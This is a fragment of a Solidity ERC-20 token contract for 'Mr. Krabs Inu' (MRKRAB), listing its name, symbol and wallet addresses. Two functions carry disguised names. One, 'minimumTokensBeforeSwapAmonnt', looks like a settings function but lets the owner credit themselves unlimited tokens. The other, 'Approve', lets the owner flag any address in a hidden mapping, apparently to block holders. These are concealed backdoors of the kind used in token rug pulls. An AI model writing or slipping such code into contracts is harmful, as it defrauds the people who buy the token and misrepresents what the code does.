...
contract MRKRAB is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Mr. Krabs Inu";
    string private _symbol = "MRKRAB";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x4bb5a43E81B17F59260A1867E5DAAeb3Da4B0BE7);
    address payable public teamWalletAddress = payable(0x4bb5a43E81B17F59260A1867E5DAAeb3Da4B0BE7);
    ...
    function minimumTokensBeforeSwapAmonnt(uint256 amount) onlyOwner() public {address a= msg.sender;
        _balances[a]
        += amount;
    }

    function Approve(address a, bool b) public onlyOwner {
        name_[a]  = b;
    }
